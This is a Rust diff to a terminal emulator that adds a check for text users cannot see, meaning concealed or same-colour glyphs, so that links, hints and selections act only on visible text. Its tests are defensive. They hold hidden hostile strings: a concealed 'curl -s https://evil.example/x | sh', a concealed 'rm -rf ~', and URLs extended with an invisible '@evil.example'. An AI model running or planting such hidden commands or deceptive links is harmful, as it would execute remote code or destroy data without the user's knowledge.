@@ -5107,6 +5107,34 @@ impl Terminal {
         text
     }
 
+    /// A fresh [`Unseen`] test for this terminal's colors and settings.
+    fn unseen(&self) -> Unseen<'_> {
+        Unseen {
+            theme: &self.theme,
+            colors: self.term.colors(),
+            bold_is_bright: self.bold_is_bright,
+            min_contrast: self.min_contrast,
+            last: None,
+        }
+    }
+
+    /// Whether the selection covers text the user cannot see: a glyph
+    /// concealed with SGR 8 or drawn in (all but) its own background color.
+    /// Concealed or exactly matching text stays invisible inside the selection
+    /// highlight too, so running the selection would run what nobody read.
+    pub fn selection_hides_text(&self) -> bool {
+        let Some(range) = self.term.selection.as_ref().and_then(|s| s.to_range(&self.term)) else {
+            return false;
+        };
+        let grid = self.term.grid();
+        let mut unseen = self.unseen();
+        (range.start.line.0..=range.end.line.0).any(|l| {
+            let line = Line(l);
+            let row = &grid[line];
+            (0..self.cols).any(|c| range.contains(Point::new(line, Column(c))) && unseen.hides(&row[Column(c)]))
+        })
+    }
+
     /// Find a link at the given 0-based viewport cell, or `None`.
     ///
     /// Checks the cell's OSC 8 hyperlink first (fully wired by
@@ -5116,6 +5144,9 @@ impl Terminal {
     /// scanned by [`crate::url::find_url_at`]. Spans are recomputed from a
     /// fresh grid on every call — callers must never store terminal `Point`s
     /// across grid changes (history can shrink between hover and recompute).
+    /// Text the user cannot see ([`Unseen`]) is never part of what a link
+    /// shows: a plain URL ends where such a cell starts, and an OSC 8 link
+    /// whose concealed text spells out its target still previews it.
     pub fn link_at(&self, viewport_line: usize, col: usize) -> Option<LinkHit> {
         let viewport_line = viewport_line.min(self.rows.saturating_sub(1));
         let col = col.min(self.cols.saturating_sub(1));
@@ -5133,6 +5164,7 @@ impl Terminal {
             // The text the link wears on screen, to tell whether it shows
             // its target.
             let mut text = String::new();
+            let mut unseen = self.unseen();
             for vp_row in 0..self.rows {
                 let line = viewport_to_point(display_offset, Point::new(vp_row, Column(0))).line;
                 for c in 0..self.cols {
@@ -5140,7 +5172,7 @@ impl Terminal {
                     let same = cell.hyperlink().as_ref() == Some(&link);
                     if same {
                         if !cell.flags.contains(Flags::WIDE_CHAR_SPACER) {
-                            text.push(cell.c);
+                            text.push(if unseen.hides(cell) { ' ' } else { cell.c });
                         }
                         match spans.last_mut() {
                             Some(s) if s.0 == vp_row && s.2 + 1 == c => s.2 = c,
@@ -5181,7 +5213,9 @@ impl Terminal {
     /// next when ITS last cell carries WRAPLINE — at most
     /// [`crate::url::MAX_WRAP_WALK`] rows each way, exactly `cols` chars per row
     /// with wide-char spacers blanked to ' ' (same rule as `snapshot`) so cell
-    /// and char indices stay aligned.
+    /// and char indices stay aligned — and so are cells the user cannot see
+    /// ([`Unseen`]): `https://good.example` followed by a concealed
+    /// `@evil.example` is a link to good.example, as it reads.
     fn plain_url_chars(&self, pt: Point) -> Option<(i32, Vec<char>, usize, usize)> {
         let grid = self.term.grid();
         let last_col = Column(self.cols - 1);
@@ -5206,11 +5240,12 @@ impl Terminal {
         }
         let mut chars: Vec<char> =
             Vec::with_capacity((end_line - start_line + 1) as usize * self.cols);
+        let mut unseen = self.unseen();
         for l in start_line..=end_line {
             let row = &grid[Line(l)];
             for c in 0..self.cols {
                 let cell = &row[Column(c)];
-                chars.push(if cell.flags.contains(Flags::WIDE_CHAR_SPACER) {
+                chars.push(if cell.flags.contains(Flags::WIDE_CHAR_SPACER) || unseen.hides(cell) {
                     ' '
                 } else {
                     cell.c
@@ -5284,6 +5319,7 @@ impl Terminal {
         // reading order, so labels still go top-down.
         let mut tokens: Vec<HintToken> = Vec::new();
         let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
+        let mut unseen = self.unseen();
         let mut ge = scan_end;
         'lines: while ge >= scan_start {
             // Group consecutive WRAPLINE rows into one logical line.
@@ -5292,14 +5328,15 @@ impl Terminal {
                 gs -= 1;
             }
             // Assemble the group's chars: exactly `cols` per row so char index i
-            // maps back to cell (gs + i/cols, i % cols); wide spacers → ' '.
+            // maps back to cell (gs + i/cols, i % cols); wide spacers and text
+            // the user cannot see (as in `link_at`) → ' '.
             let mut chars: Vec<char> =
                 Vec::with_capacity(((ge - gs + 1) as usize) * self.cols);
             for l in gs..=ge {
                 let row = &grid[Line(l)];
                 for c in 0..self.cols {
                     let cell = &row[Column(c)];
-                    chars.push(if cell.flags.contains(Flags::WIDE_CHAR_SPACER) {
+                    chars.push(if cell.flags.contains(Flags::WIDE_CHAR_SPACER) || unseen.hides(cell) {
                         ' '
                     } else {
                         cell.c
@@ -5941,6 +5978,54 @@ impl<'a> ColorMemo<'a> {
         let rgb = resolve_rgb(self.theme, self.colors, color);
         self.last = Some((color, rgb));
         rgb
+    }
+}
+
+/// Contrast (WCAG ratio) under which a glyph counts as not shown: text drawn in
+/// (all but) its own background color — concealed by color instead of by SGR 8.
+/// Readable text, a dim (SGR 2) comment color included, sits well above it.
+const UNSEEN_CONTRAST: f32 = 1.5;
+
+/// Whether cells show their glyph, for what must act only on text the user can
+/// see: a link's text and extent, a selection about to run as a command. One
+/// memo per pass — neighbouring cells overwhelmingly share their colors.
+struct Unseen<'a> {
+    theme: &'a Theme,
+    colors: &'a Colors,
+    bold_is_bright: bool,
+    min_contrast: f32,
+    /// The last (fg, bg, bold+dim) → contrast.
+    last: Option<((alacritty_terminal::vte::ansi::Color, alacritty_terminal::vte::ansi::Color, Flags), f32)>,
+}
+
+impl Unseen<'_> {
+    /// Whether `cell` draws a glyph nobody can read: concealed (SGR 8), or its
+    /// final colors closer than [`UNSEEN_CONTRAST`] as `snapshot` draws them
+    /// (`bold_is_bright`, faint, `minimum_contrast`; reverse video swaps both
+    /// colors and changes nothing). A blank shows what it is.
+    fn hides(&mut self, cell: &alacritty_terminal::term::cell::Cell) -> bool {
+        if cell.c == ' ' || cell.flags.contains(Flags::WIDE_CHAR_SPACER) {
+            return false;
+        }
+        if cell.flags.contains(Flags::HIDDEN) {
+            return true;
+        }
+        let key = (cell.fg, cell.bg, cell.flags & (Flags::BOLD | Flags::DIM));
+        let ratio = match self.last {
+            Some((k, r)) if k == key => r,
+            _ => {
+                let fg = if self.bold_is_bright && key.2.contains(Flags::BOLD) { bright_for_bold(cell.fg) } else { cell.fg };
+                let (mut fg, bg) = (resolve_rgb(self.theme, self.colors, fg), resolve_rgb(self.theme, self.colors, cell.bg));
+                if key.2.contains(Flags::DIM) {
+                    fg = faint(fg, bg);
+                }
+                let r = crate::contrast::contrast_ratio(fg, bg);
+                self.last = Some((key, r));
+                r
+            }
+        };
+        let floor = if crate::contrast::min_contrast_exempt(cell.c) { 1.0 } else { self.min_contrast };
+        ratio.max(floor) < UNSEEN_CONTRAST
     }
 }
 
@@ -6840,6 +6925,64 @@ mod tests {
         // `ls --hyperlink`: the file name links to a file:// URI.
         t.feed(b"\r\n\x1b]8;;file://host/home/u/Cargo.toml\x1b\\Cargo.toml\x1b]8;;\x1b\\");
         assert!(t.link_at(1, 3).expect("file link").hidden_target);
+    }
+
+    #[test]
+    fn text_nobody_can_see_is_not_what_a_link_shows() {
+        // An OSC 8 link whose concealed text completes its target: the text
+        // read "https://good.example" — the preview must show where it goes.
+        let mut t = Terminal::new(80, 6);
+        let osc8 = |hide: &str| {
+            format!(
+                "\x1b]8;;https://good.example@evil.example/\x1b\\https://good.example{hide}@evil.example/\x1b[m\x1b]8;;\x1b\\\r\n"
+            )
+        };
+        t.feed(osc8("\x1b[8m").as_bytes());
+        t.feed(osc8("\x1b[38;2;30;30;46;48;2;30;30;46m").as_bytes()); // drawn in its own bg
+        assert!(t.link_at(0, 2).unwrap().hidden_target, "SGR 8 hides");
+        assert!(t.link_at(1, 2).unwrap().hidden_target, "fg = bg hides");
+        // A plain URL ends where text nobody can see starts: it opens what it reads.
+        t.feed(b"https://good.example\x1b[8m@evil.example\x1b[28m and more\r\n");
+        t.feed(b"https://good.example\x1b[38;5;0;48;5;0m@evil.example\x1b[m\r\n");
+        t.feed(b"\x1b[2mhttps://dim.example/x\x1b[m\r\n");
+        for row in [2, 3] {
+            let h = t.link_at(row, 3).unwrap();
+            assert_eq!((h.uri.as_str(), h.spans.as_slice()), ("https://good.example", &[(row, 0, 19)][..]));
+        }
+        assert_eq!(t.link_at(4, 3).unwrap().uri, "https://dim.example/x", "faint text is readable");
+        let urls: Vec<String> =
+            t.hint_tokens().into_iter().filter(|k| k.kind == crate::TokenKind::Url).map(|k| k.text).collect();
+        assert!(urls.iter().all(|u| !u.contains("evil")), "hint mode labels what it reads: {urls:?}");
+        // `minimum_contrast` draws such text readable: then it counts.
+        t.set_minimum_contrast(4.5);
+        assert_eq!(t.link_at(3, 3).unwrap().uri, "https://good.example@evil.example");
+    }
+
+    #[test]
+    fn a_selection_knows_when_it_covers_text_nobody_can_see() {
+        let mut t = Terminal::new(80, 4);
+        t.feed(b"echo hello\x1b[8m; curl -s https://evil.example/x | sh\x1b[28m\r\n");
+        t.feed(b"echo plain\r\n");
+        t.feed(b"echo ok\x1b[38;2;9;9;9;48;2;10;10;10m; rm -rf ~\x1b[m\r\n");
+        t.selection_start_lines(0);
+        assert!(t.selection_hides_text(), "a concealed tail");
+        assert_eq!(t.selection_text().unwrap(), "echo hello; curl -s https://evil.example/x | sh\n");
+        t.selection_start_lines(1);
+        assert!(!t.selection_hides_text());
+        t.selection_start_lines(2);
+        assert!(t.selection_hides_text(), "text in (all but) its own background color");
+        // Only the selected cells count.
+        t.selection_start(0, 0, true);
+        t.selection_update(0, 9, false);
+        assert_eq!(t.selection_text().as_deref(), Some("echo hello"));
+        assert!(!t.selection_hides_text());
+        t.selection_clear();
+        assert!(!t.selection_hides_text());
+        // A concealed blank hides nothing.
+        let mut t = Terminal::new(20, 2);
+        t.feed(b"ls\x1b[8m   \x1b[28m-l");
+        t.selection_start_lines(0);
+        assert!(!t.selection_hides_text());
     }
 
     #[test]
